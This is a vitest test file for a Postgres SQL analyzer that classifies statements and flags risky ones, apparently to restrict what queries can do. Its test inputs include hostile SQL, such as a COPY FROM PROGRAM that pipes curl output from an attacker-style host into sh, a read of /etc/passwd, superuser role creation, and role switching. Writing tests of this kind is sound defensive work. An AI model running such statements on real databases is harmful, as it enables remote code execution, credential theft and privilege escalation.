import { beforeAll, describe, expect, it } from 'vitest';
import { analyze, initAnalyzer } from '../src/engines/postgres/analyze.js';
import type { FunctionCatalog } from '../src/engines/postgres/functions.js';
import type { Access, StatementAnalysis } from '../src/engines/types.js';

beforeAll(() => initAnalyzer());

const one = (sql: string, ctx = {}) => {
  const a = analyze(sql, ctx);
  expect(a.statements).toHaveLength(1);
  return a.statements[0];
};
const tables = (s: StatementAnalysis, op?: Access['op']) =>
  s.accesses.filter((a) => a.table && (!op || a.op === op)).map((a) => a.table).sort();

describe('kinds', () => {
  const cases: [string, StatementAnalysis['kind']][] = [
    // reads
    ['SELECT 1', 'read'],
    ['SELECT * FROM orders o JOIN public.customers c ON c.id = o.customer_id WHERE o.total_cents > 100', 'read'],
    ['SELECT count(*), lower(email) FROM customers GROUP BY 2', 'read'],
    ['SHOW search_path', 'read'],
    ['EXPLAIN SELECT * FROM orders', 'read'],
    ['EXPLAIN DELETE FROM orders', 'read'],
    ['EXPLAIN (ANALYZE false) DELETE FROM orders', 'read'],
    ['COPY orders TO STDOUT', 'read'],
    ['COPY (SELECT * FROM orders) TO STDOUT WITH CSV', 'read'],
    ['SELECT random(), gen_random_uuid(), pg_sleep(0)', 'read'],
    ['WITH recent AS (SELECT * FROM orders) SELECT * FROM recent', 'read'],
    // writes
    ["INSERT INTO orders (customer_id, total_cents) VALUES (1, 100)", 'write'],
    ["UPDATE orders SET status = 'refunded' WHERE id = 1", 'write'],
    ['DELETE FROM orders WHERE id = 1', 'write'],
    ['INSERT INTO t (id) VALUES (1) ON CONFLICT (id) DO UPDATE SET id = excluded.id', 'write'],
    ['MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE', 'write'],
    ['SELECT * FROM orders FOR UPDATE', 'write'],
    ['SELECT * FROM orders FOR KEY SHARE', 'write'],
    ['WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d', 'write'],
    ['SELECT * FROM a UNION ALL SELECT * FROM (WITH x AS (UPDATE b SET y = 1 RETURNING *) SELECT * FROM x) q', 'write'],
    ['EXPLAIN ANALYZE UPDATE orders SET status = 1', 'write'],
    ['EXPLAIN (ANALYZE) DELETE FROM orders', 'write'],
    ['EXPLAIN (ANALYZE true, BUFFERS) DELETE FROM orders', 'write'],
    ['COPY orders FROM STDIN', 'write'],
    ['COPY (DELETE FROM orders RETURNING *) TO STDOUT', 'write'],
    ["SELECT nextval('orders_id_seq')", 'write'],
    ["SELECT pg_notify('ch', 'x')", 'write'],
    ['SELECT pg_advisory_lock(1)', 'write'],
    ['SELECT my_custom_function(1)', 'write'],
    ['TRUNCATE orders', 'write'],
    ['LOCK TABLE orders', 'write'],
    ['CALL do_things()', 'write'],
    // ddl
    ['CREATE TABLE x (id int)', 'ddl'],
    ['ALTER TABLE orders ADD COLUMN note text', 'ddl'],
    ['DROP TABLE orders', 'ddl'],
    ['CREATE INDEX CONCURRENTLY ON orders (status)', 'ddl'],
    ['CREATE VIEW v AS SELECT * FROM orders', 'ddl'],
    ['CREATE TABLE copy AS SELECT * FROM orders', 'ddl'],
    ['SELECT * INTO backup FROM orders', 'ddl'],
    ['CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$', 'ddl'],
    ["COMMENT ON TABLE orders IS 'x'", 'ddl'],
    // admin
    ['GRANT SELECT ON orders TO someone', 'admin'],
    ['CREATE ROLE intruder SUPERUSER', 'admin'],
    ["ALTER SYSTEM SET work_mem = '1GB'", 'admin'],
    ['CREATE EXTENSION dblink', 'admin'],
    ['VACUUM orders', 'admin'],
    ['ANALYZE orders', 'admin'],
    ["DO $$ BEGIN EXECUTE 'DROP TABLE orders'; END $$", 'admin'],
    ["COPY orders FROM PROGRAM 'curl evil.sh | sh'", 'admin'],
    ["COPY orders TO '/tmp/out.csv'", 'admin'],
    ['SELECT pg_terminate_backend(123)', 'admin'],
    ["SELECT pg_catalog.set_config('role', 'postgres', false)", 'admin'],
    ["SELECT query_to_xml('DELETE FROM orders RETURNING 1', true, false, '')", 'admin'],
    ["SELECT dblink_exec('host=x', 'DELETE FROM t')", 'admin'],
    ["SELECT pg_read_file('/etc/passwd')", 'admin'],
    ['SET ROLE postgres', 'admin'],
    ['SET session_authorization = postgres', 'admin'],
    ['SET default_transaction_read_only = off', 'admin'],
    ['SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE', 'admin'],
    ['SET TRANSACTION READ WRITE', 'admin'],
    ['BEGIN READ WRITE', 'admin'],
    ["SET client_encoding = 'SQL_ASCII'", 'admin'],
    ['SET standard_conforming_strings = off', 'admin'],
    ["PREPARE TRANSACTION 'x'", 'admin'],
    ['EXECUTE never_prepared', 'admin'],
    ['selec 1 from', 'admin'],
    // session
    ['BEGIN', 'session'],
    ['BEGIN ISOLATION LEVEL SERIALIZABLE', 'session'],
    ['BEGIN READ ONLY', 'session'],
    ['COMMIT', 'session'],
    ['ROLLBACK', 'session'],
    ['SAVEPOINT a', 'session'],
    ['SET search_path = app, public', 'session'],
    ["SET application_name = 'psql'", 'session'],
    ['SET LOCAL statement_timeout = 5000', 'session'],
    ['SET TRANSACTION ISOLATION LEVEL REPEATABLE READ', 'session'],
    ['RESET ALL', 'session'],
    ['DEALLOCATE ALL', 'session'],
    ['LISTEN events', 'session'],
  ];
  it.each(cases)('%s → %s', (sql, kind) => {
    expect(one(sql).kind).toBe(kind);
  });
});

describe('tables', () => {
  it('records which tables are read and written', () => {
    const s = one("UPDATE orders SET status = 'x' FROM customers c WHERE c.id = orders.customer_id");
    expect(tables(s, 'write')).toEqual(['orders']);
    expect(tables(s, 'read')).toEqual(['customers']);
  });

  it('keeps schema qualification and folds unquoted case', () => {
    expect(tables(one('SELECT * FROM Sales.Orders, "MixedCase"'))).toEqual(['MixedCase', 'sales.orders']);
  });

  it('does not report CTE names as tables, but does report tables written inside CTEs', () => {
    const s = one('WITH d AS (DELETE FROM orders WHERE id < 5 RETURNING *) SELECT * FROM d JOIN customers ON true');
    expect(tables(s, 'write')).toEqual(['orders']);
    expect(tables(s, 'read')).toEqual(['customers']);
  });

  it('treats FOR UPDATE as writing the locked tables', () => {
    expect(tables(one('SELECT * FROM orders WHERE id = 1 FOR UPDATE'), 'write')).toEqual(['orders']);
  });

  it('names dropped and truncated tables', () => {
    expect(tables(one('DROP TABLE public.orders, customers'), 'ddl')).toEqual(['customers', 'public.orders']);
    expect(tables(one('TRUNCATE orders, customers'), 'write')).toEqual(['customers', 'orders']);
  });

  it('EXPLAIN ANALYZE carries the inner write; plain EXPLAIN is a read of the same tables', () => {
    expect(tables(one('EXPLAIN ANALYZE DELETE FROM orders'), 'write')).toEqual(['orders']);
    expect(tables(one('EXPLAIN DELETE FROM orders'), 'read')).toEqual(['orders']);
  });

  it('finds tables in DDL and admin statements', () => {
    expect(tables(one('ALTER TABLE orders ADD COLUMN note text'), 'ddl')).toEqual(['orders']);
    expect(tables(one('ALTER TABLE app.orders RENAME TO old_orders'), 'ddl')).toEqual(['app.orders']);
    expect(tables(one('CREATE INDEX i ON orders (status)'), 'ddl')).toEqual(['orders']);
    expect(tables(one('GRANT SELECT ON orders TO someone'), 'admin')).toEqual(['orders']);
    expect(tables(one('VACUUM orders'), 'admin')).toEqual(['orders']);
    expect(tables(one("COMMENT ON TABLE orders IS 'x'"))).toEqual([]);
  });

  it('views and CTAS read their source and define the target', () => {
    const s = one('CREATE VIEW paid AS SELECT * FROM orders');
    expect(tables(s, 'ddl')).toEqual(['paid']);
    expect(tables(s, 'read')).toEqual(['orders']);
  });
});

describe('verbs', () => {
  const verbs = (sql: string) => [...new Set(one(sql).accesses.filter((a) => a.op !== 'read').map((a) => a.verb))].sort();
  it.each([
    ['INSERT INTO orders (total_cents) VALUES (1)', ['insert']],
    ['UPDATE orders SET status = 1 WHERE id = 1', ['update']],
    ['DELETE FROM orders WHERE id = 1', ['delete']],
    ['MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE', ['merge']],
    ['INSERT INTO t (id) VALUES (1) ON CONFLICT (id) DO UPDATE SET id = excluded.id', ['insert', 'update']],
    ['INSERT INTO t (id) VALUES (1) ON CONFLICT DO NOTHING', ['insert']],
    ['TRUNCATE orders', ['truncate']],
    ['COPY orders FROM STDIN', ['insert']],
    ['SELECT * FROM orders FOR UPDATE', ['lock']],
    ["SELECT nextval('s')", ['function']],
    ['WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d', ['delete']],
    ['EXPLAIN ANALYZE DELETE FROM orders', ['delete']],
    ['CREATE TABLE x (id int)', ['create']],
    ['CREATE INDEX i ON orders (id)', ['create']],
    ['ALTER TABLE orders ADD COLUMN c int', ['alter']],
    ["COMMENT ON TABLE orders IS 'x'", ['alter']],
    ['DROP TABLE orders', ['drop']],
    ['GRANT SELECT ON orders TO x', ['admin']],
  ])('%s → %j', (sql, expected) => {
    expect(verbs(sql)).toEqual(expected);
  });
  it('reads are select', () => {
    expect(one('SELECT * FROM orders').accesses.every((a) => a.verb === 'select')).toBe(true);
  });
});

describe('flags', () => {
  it('flags UPDATE/DELETE without WHERE and destructive statements', () => {
    expect(one('DELETE FROM orders').flags).toContain('no_where');
    expect(one('DELETE FROM orders WHERE id = 1').flags).not.toContain('no_where');
    expect(one('TRUNCATE orders').flags).toContain('destructive');
    expect(one('DROP TABLE orders').flags).toContain('destructive');
    expect(one('CREATE INDEX CONCURRENTLY i ON orders (id)').flags).toContain('no_transaction');
    expect(one('BEGIN').flags).toContain('transaction_control');
  });
});

describe('multi-statement strings', () => {
  it('analyzes each statement separately with its own text', () => {
    const a = analyze('SELECT 1; DELETE FROM orders WHERE id = 2;\n  SELECT 3');
    expect(a.statements.map((s) => [s.kind, s.text])).toEqual([
      ['read', 'SELECT 1'],
      ['write', 'DELETE FROM orders WHERE id = 2'],
      ['read', 'SELECT 3'],
    ]);
  });

  it('slices statement text correctly after multi-byte characters', () => {
    const a = analyze("SELECT 'héllo ✓'; SELECT 2");
    expect(a.statements.map((s) => s.text)).toEqual(["SELECT 'héllo ✓'", 'SELECT 2']);
  });

  it('BEGIN; COMMIT; DELETE is still a write', () => {
    expect(analyze('BEGIN; COMMIT; DELETE FROM orders').statements.map((s) => s.kind)).toEqual(['session', 'session', 'write']);
  });

  it('reports parse errors as a single admin statement', () => {
    const a = analyze('SELECT FROM WHERE');
    expect(a.error).toMatch(/syntax error/);
    expect(a.statements[0].kind).toBe('admin');
  });
});

describe('prepared statements', () => {
  it('PREPARE remembers the analysis and EXECUTE reuses it', () => {
    const prep = one('PREPARE wipe AS DELETE FROM orders');
    expect(prep.kind).toBe('session');
    expect(prep.prepared?.analysis.kind).toBe('write');
    const prepared = new Map([[prep.prepared!.name, prep.prepared!.analysis]]);
    expect(one('EXECUTE wipe', { prepared }).kind).toBe('write');
    expect(one('EXPLAIN ANALYZE EXECUTE wipe', { prepared }).kind).toBe('write');
  });
});

describe('function catalog', () => {
  const catalog: FunctionCatalog = new Map([
    ['safe_report', false],
    ['public.safe_report', false],
    ['bump_counter', true],
    ['lower', false],
  ]);
  it('uses catalog volatility when available', () => {
    expect(one('SELECT safe_report()', { catalog }).kind).toBe('read');
    expect(one('SELECT public.safe_report()', { catalog }).kind).toBe('read');
    expect(one('SELECT bump_counter()', { catalog }).kind).toBe('write');
    expect(one('SELECT not_in_catalog()', { catalog }).kind).toBe('write');
    expect(one('SELECT lower(email) FROM customers', { catalog }).kind).toBe('read');
  });
  it('the denylist wins over the catalog', () => {
    expect(one('SELECT pg_terminate_backend(1)', { catalog: new Map([['pg_terminate_backend', false]]) }).kind).toBe('admin');
  });
  it('does not trust a user function named like a harmless built-in', () => {
    const shadow: FunctionCatalog = new Map<string, boolean | 'opaque'>([
      ['public.gen_random_uuid', 'opaque'], ['gen_random_uuid', 'opaque'], ['pg_catalog.gen_random_uuid', true],
    ]);
    expect(one('SELECT public.gen_random_uuid()', { catalog: shadow }).flags).toContain('opaque_function');
    expect(one('SELECT gen_random_uuid()', { catalog: shadow }).flags).toContain('opaque_function');
    expect(one('SELECT pg_catalog.gen_random_uuid()', { catalog: shadow }).kind).toBe('read');
    expect(one('EXPLAIN SELECT public.gen_random_uuid()', { catalog: shadow }).flags).toContain('opaque_function');
  });
});
